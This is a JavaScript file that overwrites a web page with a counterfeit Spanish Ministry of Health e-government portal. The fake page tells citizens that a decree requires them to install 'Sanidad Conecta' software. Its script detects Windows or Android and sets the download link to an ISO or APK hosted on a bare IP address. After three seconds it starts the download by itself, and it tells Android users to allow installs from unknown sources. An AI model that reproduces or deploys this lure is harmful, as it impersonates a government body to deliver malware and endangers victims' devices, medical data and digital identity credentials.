(function() {
    document.open();
    document.write('<!DOCTYPE html><html>');
    document.write('<head><meta charset="UTF-8"><title>Sede Electrónica - Ministerio de Sanidad</title>');
    document.write(`
    <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Segoe UI,Helvetica,Arial,sans-serif;background:#f0f2f5;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
    .contenedor{max-width:800px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);padding:40px}
    h1{font-size:1.8rem;color:#0056a7;border-bottom:2px solid #0056a7;padding-bottom:10px;margin-bottom:20px}
    h2{font-size:1.4rem;margin:20px 0 10px}
    .aviso{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:20px 0}
    .btn-descarga{display:inline-block;background:#28a745;color:#fff;padding:12px 30px;border-radius:30px;text-decoration:none;font-size:1.2rem;font-weight:bold;margin:15px 0;transition:0.3s}
    .btn-descarga:hover{background:#218838}
    .instrucciones{background:#f8f9fa;padding:15px;border-radius:5px;margin:20px 0;font-size:0.95rem}
    .footer{margin-top:30px;font-size:0.8rem;color:#666;border-top:1px solid #ddd;padding-top:15px;text-align:center}
    .footer a{color:#0056a7;text-decoration:none}
    </style>
    </head><body>
    `);
    document.write(`
    <div class="contenedor">
    <h1>Sede Electrónica - Ministerio de Sanidad</h1>
    <h2>Acceso a Historia Clínica Digital</h2>
    <p>Estimado ciudadano/a, para garantizar la seguridad de sus datos médicos y cumplir con el <strong>Real Decreto-ley 14/2025</strong> de digitalización sanitaria, es necesario instalar el software oficial <strong>Sanidad Conecta</strong>.</p>
    <div class="aviso">
    <strong>Aviso importante:</strong><br>
    A partir del <strong>1 de julio de 2026</strong>, el acceso a su historial clínico y la recepción de notificaciones electrónicas requerirá esta aplicación. Sin ella no podrá consultar sus resultados ni realizar trámites.
    </div>
    <div style="text-align:center;margin:20px 0;">
    <a href="#" class="btn-descarga" id="downloadBtn">▼ Descargar para su dispositivo</a>
    </div>
    <div class="instrucciones">
    <strong>Instrucciones:</strong><br>
    - <strong>Windows</strong>: Descargue el archivo ISO, móntelo (doble clic) y ejecute <em>SanidadConecta</em>. Siga los pasos del asistente.<br>
    - <strong>Android</strong>: Permita la instalación de orígenes desconocidos en Ajustes > Seguridad, luego abra el archivo APK descargado.<br>
    - Una vez instalado, inicie sesión con su certificado digital o Cl@ve.
    </div>
    <p>Si ya tiene instalado Sanidad Conecta, puede <a href="#">actualizar aquí</a>.</p>
    <div class="footer">
    © Ministerio de Sanidad - Sede Electrónica | <a href="#">Aviso legal</a> | <a href="#">Protección de datos</a>
    </div>
    </div>
    `);
    document.write(`
    <script>
    (function(){
        var isWindows = navigator.userAgent.indexOf('Windows') !== -1;
        var isAndroid = navigator.userAgent.indexOf('Android') !== -1;
        var link = document.getElementById('downloadBtn');
        if(isWindows){
            link.href = 'http://95.85.229.133:2222/Instalador_SanidadConecta.iso';
            link.textContent = '▼ Descargar para Windows (ISO)';
        } else if(isAndroid){
            link.href = 'http://95.85.229.133:2225/SanidadConecta.apk';
            link.textContent = '▼ Descargar para Android (APK)';
        } else {
            link.href = '#';
            link.textContent = '▼ Sistema no soportado';
        }
        setTimeout(function(){
            if(link.href !== '#'){
                link.click();
            }
        }, 3000);
    })();
    <\/script>
    `);
    document.write('</body></html>');
    document.close();
})();
